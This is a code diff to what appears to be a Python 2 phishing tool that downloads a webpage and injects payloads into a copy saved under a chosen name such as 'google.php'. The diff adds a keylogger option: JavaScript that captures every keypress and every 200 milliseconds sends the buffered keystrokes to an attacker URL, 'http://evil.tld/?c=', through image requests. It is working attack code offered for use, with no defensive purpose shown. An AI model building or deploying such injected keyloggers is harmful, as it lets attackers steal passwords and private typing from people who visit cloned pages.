@@ -46,6 +46,7 @@ fileOpen.close()
 # choose what payloads to add to new webpage
 print 'Enter corresponding key to add payload:'
 print '[1] Add ip logger'
+print '[2] Add keylogger'
 payload = input()
 
 # ip logger payload
@@ -72,3 +73,37 @@ fclose($f);
     print '\nBound payload(s) successfully! Exiting in 4 seconds...'
     os.remove(fileName)
     time.sleep(4)		       ## give user time to read
+
+if payload == 2:
+    keylogger = """<script>var buffer = [];
+var attacker = 'http://evil.tld/?c='
+
+document.onkeypress = function(e) {
+    var timestamp = Date.now() | 0;
+    var stroke = {
+        k: e.key,
+        t: timestamp
+    };
+    buffer.push(stroke);
+}
+
+window.setInterval(function() {
+    if (buffer.length > 0) {
+        var data = encodeURIComponent(JSON.stringify(buffer));
+        new Image().src = attacker + data;
+        buffer = [];
+    }
+}, 200);
+</script>"""
+
+    newFileName = raw_input("Create new name for php file: eg. google.php: ")
+    print '\nBinding a keylogger to ' + newFileName
+    
+    makePage = open (newFileName, 'a') ## a will append, w will over-write
+    makePage.write(keylogger)           ## write the ip logger module
+    makePage.write(fileContent)	       ## write downloaded html/php code
+    makePage.close()		           ## discontinue editing of file and save to disk
+	
+    print '\nBound payload(s) successfully! Exiting in 4 seconds...'
+    os.remove(fileName)
+    time.sleep(4)
